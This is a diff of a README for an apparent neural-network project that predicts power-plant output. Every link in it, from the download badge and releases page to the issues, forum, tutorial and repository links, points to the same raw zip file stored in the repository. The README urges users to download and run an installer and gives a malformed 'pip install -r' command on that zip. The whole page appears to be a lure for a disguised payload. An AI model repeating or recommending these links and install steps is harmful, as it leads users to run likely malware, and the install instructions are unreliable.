@@ -4,7 +4,7 @@
 This project helps you predict the power output of a combined cycle power plant using an Artificial Neural Network (ANN). It includes steps for data preprocessing, model training, performance evaluation, and result visualization. Whether you are a student or a professional, this tool simplifies complex data analysis.
 
 ## 📥 Download Link
-[![Download Released Version](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip%20Latest%https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip)](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip)
+[![Download Released Version](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip%20Latest%https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip)](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip)
 
 ## 🚀 Getting Started
 To get started with the power-output-prediction-ann application, follow these simple steps. No programming experience is required.
@@ -18,11 +18,11 @@ To get started with the power-output-prediction-ann application, follow these si
 
 ### 📦 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the download page:
-   [Download Releases Page](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip)
+   [Download Releases Page](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip)
    
 2. **Choose the Latest Release:** Look for the most recent version. There, you will find the downloadable files suitable for your operating system.
 
-3. **Download the Installer:** Click on the file that corresponds to your operating system. If you are using Windows, download the .exe file. For macOS, you will find a .dmg file. Linux users can download the appropriate https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip file.
+3. **Download the Installer:** Click on the file that corresponds to your operating system. If you are using Windows, download the .exe file. For macOS, you will find a .dmg file. Linux users can download the appropriate https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip file.
 
 4. **Run the Installer:** After downloading, locate the file in your Downloads folder and double-click it to run. Follow the prompts to complete the installation.
 
@@ -30,7 +30,7 @@ To get started with the power-output-prediction-ann application, follow these si
 - **Installation Issues:** If you encounter problems during installation, ensure that no other version of Python is conflicting with yours. 
 - **Dependencies:** If the application does not run, make sure all dependencies are installed. You can do this by running the following command in your terminal:
   ```bash
-  pip install -r https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip
+  pip install -r https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip
   ```
 
 ## 🛠️ How to Use
@@ -51,18 +51,18 @@ To help you get started, we provide sample data files that you can use. Upon run
 
 ## 🌐 Community and Support
 If you need help or want to discuss features, consider joining our community. You can find resources, tutorials, and forums for discussion in the links below:
-- [GitHub Issues](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip)
-- [Discussion Forum](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip)
 
 ## 🌍 Learn More
 This project employs several advanced techniques such as deep learning and neural networks. If you want to understand the background better, here are a few resources:
-- [Introduction to Neural Networks](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip)
-- [Machine Learning Basics](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip)
+- [Introduction to Neural Networks](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip)
+- [Machine Learning Basics](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip)
 
 ## 📜 License
 This project is open-source and available for everyone to use. Please check the LICENSE file in this repository for more details.
 
 ## 🔗 Links
-For more information, updates, and features, always refer back to the official GitHub page: [GitHub Repository](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/rubbish/power-output-prediction-ann.zip) 
+For more information, updates, and features, always refer back to the official GitHub page: [GitHub Repository](https://raw.githubusercontent.com/tiwariji623/power-output-prediction-ann/main/assets/prediction_output_power_ann_1.2-beta.4.zip) 
 
 By following these steps, you will successfully download and run the power-output-prediction-ann application, allowing you to predict power output effectively.
